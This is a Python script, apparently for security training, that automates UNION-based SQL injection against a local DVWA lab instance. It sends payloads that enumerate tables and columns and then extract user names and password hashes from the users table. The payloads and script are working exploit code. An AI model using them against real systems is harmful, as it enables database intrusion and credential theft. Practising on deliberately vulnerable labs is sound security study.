import requests
import re

# Target URL — DVWA must be running locally at 127.0.0.1
# The requests library handles URL-encoding of special characters automatically.
# Manual browser URL shows: ?id=%27&Submit=Submit
# Here we pass the raw payload and let requests encode it.
target_url = "http://127.0.0.1/dvwa/vulnerabilities/sqli/"

# Session cookie obtained after logging into DVWA.
# Retrieve PHPSESSID from browser DevTools → Application → Cookies.
# Replace the placeholder value below with your actual session cookie.
cookies = {
    "PHPSESSID": "your_session_cookie_here",
    "security": "low"
}


def exploit_sqli(payload):
    """
    Send a SQL injection payload as a GET request parameter.
    Returns the raw HTML response body, or None on network failure.
    """
    params = {
        "id": payload,
        "Submit": "Submit"
    }
    try:
        response = requests.get(
            target_url,
            params=params,
            cookies=cookies,
            timeout=5
        )
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return None


def extract_data(html_content):
    """
    Parse injected data from DVWA response HTML.

    DVWA renders results in this structure:
      <pre>ID: ...<br />First name: VALUE<br />Surname: VALUE</pre>

    We use UNION SELECT to place our extracted data into the
    'First name' and 'Surname' output fields.
    Column 1 → First name field
    Column 2 → Surname field
    """
    # Use <br as delimiter since DVWA uses <br /> between fields
    first_names = re.findall(r"First name:\s*(.*?)<br", html_content)
    # Surname is followed by </pre> — safe closing delimiter
    surnames = re.findall(r"Surname:\s*(.*?)</pre>", html_content)

    if not first_names:
        print("[-] No data extracted. Verify: cookie value, DVWA URL, payload syntax.")
        return

    for col1, col2 in zip(first_names, surnames):
        print(f"[+] Column 1: {col1.strip()} | Column 2: {col2.strip()}")


if __name__ == "__main__":
    print("[*] DVWA SQLi Automated Extraction Script")
    print("[*] Method: UNION-Based In-Band SQL Injection")
    print("-" * 60)

    # Stage 1: Extract table names from the current database
    # id=0 ensures no real row is returned — only our UNION data displays
    print("[*] Stage 1 — Enumerating tables in current database...")
    payload_tables = (
        "0' UNION SELECT null, table_name "
        "FROM information_schema.tables "
        "WHERE table_schema=database()-- -"
    )
    html = exploit_sqli(payload_tables)
    if html:
        extract_data(html)

    print()

    # Stage 2: Extract column names from the users table
    print("[*] Stage 2 — Enumerating columns in users table...")
    payload_columns = (
        "0' UNION SELECT null, column_name "
        "FROM information_schema.columns "
        "WHERE table_name='users' AND table_schema=database()-- -"
    )
    html = exploit_sqli(payload_columns)
    if html:
        extract_data(html)

    print()

    # Stage 3: Extract credentials from the users table
    print("[*] Stage 3 — Extracting credentials...")
    payload_creds = "0' UNION SELECT user, password FROM users-- -"
    html = exploit_sqli(payload_creds)
    if html:
        extract_data(html)

    print("-" * 60)
    print("[*] Extraction complete. Total requests sent: 3")
